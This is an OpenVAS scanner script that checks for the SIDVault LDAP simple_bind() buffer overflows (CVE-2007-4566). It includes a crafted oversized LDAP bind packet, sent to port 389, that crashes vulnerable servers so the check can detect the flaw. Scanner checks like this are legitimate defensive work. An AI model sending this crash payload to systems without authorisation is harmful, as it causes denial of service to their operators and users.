###############################################################################
# OpenVAS Vulnerability Test
# $Id: SIDVault_25460.nasl 15 2013-10-27 12:49:54Z jan $
#
# SIDVault 'simple_bind()' Function Multiple Remote Buffer Overflow Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "SIDVault is prone to multiple remote buffer-overflow vulnerabilities because
the application fails to properly bounds- check user-supplied input before
copying it to an insufficiently sized memory buffer.

An attacker can exploit these issues to execute arbitrary code with superuser
privileges. Successfully exploiting these issues will result in the complete
compromise of affected computers. Failed exploit attempts will result in a
denial-of-service condition.

These issues affect versions prior to SIDVault 2.0f.";

tag_solution = "The vendor released SIDVault 2.0f to address this issue. Please see
the references for more information.";

if (description)
{
 script_id(100270);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-09-07 09:47:24 +0200 (Mon, 07 Sep 2009)");
 script_bugtraq_id(25460);
 script_cve_id("CVE-2007-4566");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_tag(name:"risk_factor", value:"Critical");

 script_name("SIDVault 'simple_bind()' Function Multiple Remote Buffer Overflow Vulnerabilities");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;


 script_description(desc);
 script_summary("Determine if SIDVault is prone to remote buffer-overflow vulnerabilitie");
 script_category(ACT_DENIAL);
 script_family("Buffer overflow");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("ldap_detect.nasl");
 script_require_ports("Services/ldap", 389);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/25460");
 script_xref(name : "URL" , value : "http://www.alphacentauri.co.nz/sidvault/index.htm");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/477821");
 exit(0);
}

include("ldap.inc");

if(safe_checks())exit(0);

port = get_kb_item("Services/ldap");
if(!get_tcp_port_state(port))exit(0);

soc = open_sock_tcp(port);
if (!soc) exit(0);

data = raw_string(0x30,0x82,0x11,0x18,0x02,0x01,0x01,0x60,
		  0x82,0x11,0x11,0x02,0x01,0x03,0x04,0x82,
		  0x10,0x06,0x64,0x63,0x3d);

data += crap(data:"A",length:4099);

data += raw_string(0x80,0x82,0x01,0x00);

data += crap(data:"B",length:256);

data += raw_string(0x30,0x05,0x02,0x01,0x02,0x42,0x00);

send(socket:soc, data:data);
ddata = recv(socket:soc, length:4096);
close(soc);

if(strlen(ddata))exit(0); # got an answer. Not dead...

sleep(5);

if(!ldap_alive(port:port)) {
  security_hole(port:port);
  exit(0);
} 

exit(0);
